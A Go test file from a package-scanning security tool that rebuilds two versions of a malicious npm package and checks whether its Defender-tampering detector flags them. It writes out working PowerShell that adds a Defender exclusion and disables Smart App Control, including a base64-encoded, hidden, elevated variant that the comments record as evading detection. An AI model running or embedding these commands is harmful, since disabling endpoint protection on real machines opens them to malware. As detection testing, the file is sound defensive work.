package intelligence

import (
	"encoding/base64"
	"encoding/binary"
	"testing"
	"unicode/utf16"

	"github.com/chain305/chainsaw-core/risk"
)

// @apexacc/cli (row 57, vigihq VIGI-001-2026). package/apex.cjs adds a
// Defender exclusion for ~/.apex (the download folder) and sets
// HKLM\SYSTEM\CurrentControlSet\Control\CI\Policy to turn Smart App
// Control off, then downloads a binary that runs C2-chosen PowerShell.
//
//	1.5.121: the two commands in plain code (no elevation, usually failed).
//	1.5.122: the same commands base64-encoded, launched in a hidden,
//	         elevated PowerShell (-EncodedCommand, Start-Process -Verb RunAs).
//
// 1.5.121 -> iocscan.DefenderTamper -> sc.defender_tamper (warn-capped, 40)
// -> verdict warn. 1.5.122 -> nothing: the regex reads plaintext cmdlets
// only. FINDING: core/iocscan/indicators.go defenderTamperRE does not decode
// -EncodedCommand, so the weaponised release scores clean on this lane.
func TestAttack2026_57_ApexaccCLI_DefenderTamper(t *testing.T) {
	cmd := `Add-MpPreference -ExclusionPath "$env:USERPROFILE\.apex"; ` +
		`Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy' -Name VerifiedAndReputablePolicyState -Value 0`
	plain := "const {execSync}=require('child_process');\n" +
		"if(process.platform==='win32'){try{execSync(`powershell -NoProfile -Command \"" + cmd + "\"`);}catch(e){}}\n"

	enc := utf16.Encode([]rune(cmd))
	raw := make([]byte, 2*len(enc))
	for i, u := range enc {
		binary.LittleEndian.PutUint16(raw[2*i:], u)
	}
	b64 := base64.StdEncoding.EncodeToString(raw)
	// Windows 11 UAC elevation for SAC disable + exclusion
	elevated := "const {spawn}=require('child_process');\n" +
		"spawn('powershell',['-WindowStyle','Hidden','-Command'," +
		"\"Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList '-EncodedCommand " + b64 + "'\"],{detached:true,windowsHide:true});\n"

	p := newIOCScanProvider()
	score := func(version, apex string) *Report {
		scan := atkBRun(t, p, "@apexacc/cli", version, atkBTarball(t, map[string]string{
			"package.json": `{"name":"@apexacc/cli","version":"` + version + `","bin":{"apex":"apex.cjs"},"license":"MIT"}`,
			"apex.cjs":     apex,
		}))
		r := &Report{Identity: IdentitySection{Ecosystem: "npm", Package: "@apexacc/cli", Version: version}}
		r.Metadata.LicenseExpression = "MIT"
		MergeScan(&r.Scan, scan)
		ComputeTrustScoreForOrg(r, "")
		return r
	}

	r121 := score("1.5.121", plain)
	if r121.Scan.DefenderTamper == "" || !atkBFired(r121, risk.SignalSCDefenderTamper) {
		t.Fatalf("1.5.121 plaintext: want sc.defender_tamper, got scan=%q", r121.Scan.DefenderTamper)
	}
	if r121.Risk.Verdict == risk.VerdictAllow || r121.SupplyChain.TrustScore > 40 {
		t.Fatalf("1.5.121: want a verdict off allow with score <= 40, got %s / %d", r121.Risk.Verdict, r121.SupplyChain.TrustScore)
	}

	r122 := score("1.5.122", elevated)
	if r122.Scan.DefenderTamper != "" || atkBFired(r122, risk.SignalSCDefenderTamper) {
		t.Fatalf("1.5.122 -EncodedCommand now detected — update the finding: %q", r122.Scan.DefenderTamper)
	}

	// Negative control: reading Defender state is not tampering.
	r120 := score("1.5.120", "require('child_process').execSync('powershell -Command \"(Get-MpPreference).ExclusionPath\"');\n")
	if r120.Scan.DefenderTamper != "" || atkBFired(r120, risk.SignalSCDefenderTamper) {
		t.Fatalf("Get-MpPreference flagged: %q", r120.Scan.DefenderTamper)
	}
	t.Logf("1.5.121 verdict=%s score=%d; 1.5.122 verdict=%s score=%d; 1.5.120 verdict=%s score=%d",
		r121.Risk.Verdict, r121.SupplyChain.TrustScore, r122.Risk.Verdict, r122.SupplyChain.TrustScore,
		r120.Risk.Verdict, r120.SupplyChain.TrustScore)
}
